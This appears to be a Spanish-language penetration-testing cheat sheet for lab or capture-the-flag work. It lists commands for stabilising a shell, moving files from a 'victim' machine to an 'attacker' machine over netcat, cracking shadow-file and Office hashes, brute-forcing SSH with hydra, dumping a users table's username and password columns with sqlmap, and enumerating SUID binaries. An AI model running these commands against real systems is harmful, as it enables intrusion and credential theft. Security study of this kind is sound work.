 ### Tratamiento de la TTY
#tecnicas
```python
	script /dev/null -c bash # Lanza pseudoconsola
	
	[ctrl+z] # Suspende la shell actual
	
	stty raw -echo; fg # Recupera la shell suspendida
	
	reset xterm # Reinicia la configuración de la terminal xterm # Especifica el tipo de terminal
	
	export TERM=xterm # Asigna xterm a la variable TERM
	
	export SHELL=bash # Asigna bash a la variable SHELL
	
	stty rows <VALOR_FILAS> columns <VALOR_COLUMNAS>
	
	Para ver el valor de filas y columnas de nuestra terminal se utiliza el comando -> stty -a
 ```
 
### TTY Shell con Python

```python
	python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Copiar al clipboard

```python
	cat archivo.txt | xclip -sel clip
```
### Descompresión

```python
#.tar
	
	tar -xf archive.tar.gz
	
#.gz
	
	gzip -d file.gz
	
#.zip
	
	unzip file.zip
```
### Comparación de archivos

```python
	diff -c scan-a.txt scan-b.txt
	
	comm scan-a.txt scan-b.txt
```
### Transferencia de archivos

```python 
#HTTP
	
#Servidor
	
	python3 -m http.server
	
	python -m SimpleHTTPServer

#Cliente
	
	certutil.exe -urlcache -f http://<SERVER_IP>/file.txt file.txt
	
	wget http://<SERVER_IP>/file.txt
```
### FTP
```python
#Servidor
	
	python3 -m pyftpdlib
	
#Cliente
	
	ftp <SERVER_IP>
```
### Netcat
```python

#Servidor

	nc 10.10.14.2 4242 < file

#Cliente

	nc -lvnp 4242 > file
----------------------------------------------------------------------------------------------------------------------------------------------------------
	# maquina atacante
	nc -lvnp "Port" > "archivo"
----------------------------------------------------------------------------------------------------------------------------------------------------------
	# maquina victima
	nc "IP" "Port" < "archivo"

```
### ssh

```python
scp -r ''USER@IP:/ruta/* . * ruta donde queremos copiar(.)''
```
---

### información de procesos

```python
	ps -faux
```
### Sniffing

```python
	tcpdump -i tun0 icmp -n
 
```
### Cracking

```python
	john --wordlist=/usr/share/wordlists/rockyou.txt hash
	
	hashcat -a 0 -m 1600 hash /usr/share/wordlists/rockyou.txt
```

### Cracking de contraseñas con password y shadow

```python 
	unshadow <Archivo_passwd> <Archivo_shadow> > <Archivo_hash>
	
	john --wordlist=<Ruta_Diccionario> <Archivo_hash>
```
### Cracking de documentos encriptados de Office

```python 
	office2john.py <Ruta_Documento> > <Archivo_hash>
	
	john --wordlist=<Ruta_Diccionario> <Archivo_hash>
``` 
### Extraer información de imágenes

```python
	steghide --extract -sf archivo.png/jpg
```
### Búsqueda de exploits

```python
	searchsploit <SOFTWARE>
	
	searchsploit -x <ID_EXPLOIT> # Inspeccionar el código del exploit
	
	searchsploit -m <ID_EXPLOIT> # Mueve el exploit al directorio actual de trabajo
```
### Buscador de archivos

```python
	find / -iname nombre_archivo
```

### Permisos SUID

```python
	find / -perm -4000 -ls 2>/dev/null
```
### Fuerza bruta con hydra para ssh

```python
	hydra 127.0.0.1 ssh -s 22 -L users -P worstpasswords.txt -f -vV 
```

### Cambio de usuario sobre archivos 

```python
	sudo chown root:root nombre_del_archivo
```

### sqlmap

```python
	sqlmap -r request.req -p searchitem --batch -D sqlitraining -T users -C usarname,passwoed --dumb
```

### numero de caracteres

```python
	echo -n "caracteres" | wc -c
```

### Grep
```python
cat data_users.txt | grep ':' | tr -d ' ' 

# este comando lo que hace es limpiar el archivo para que silo muestre las lineas que contengan : y tambien elimina los espacios en blanco
-------------------------------------------------------------------------------------------------------------------------------------------
cat archivo.txt | sed '/^\s*$/d' | tr -d ' ' | awk '{print $2}' FS="("
# Lee el contenido del archivo `creds.txt`.
# Elimina las líneas vacías o que contienen solo espacios en blanco.
# Elimina todos los espacios en blanco de las líneas restantes.
# Divide cada línea en campos usando `(` como delimitador y imprime el segundo campo.

```

### Capabilitis 

```python
	getcap -r / 2>/dev/null
```

### Standard PAHT

```python
	export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

### Integridad del hash de un binario compartido
```python
	md5sum Binario
```

### Listar conexiones de red
```python
	lsof -i
	
	lsof -i:port
```

### Eternal blue
```python
nmap -p445 --script smb-vuln-ms17-010 IP

nmap -p445 --script "vuln and safe" IP
```
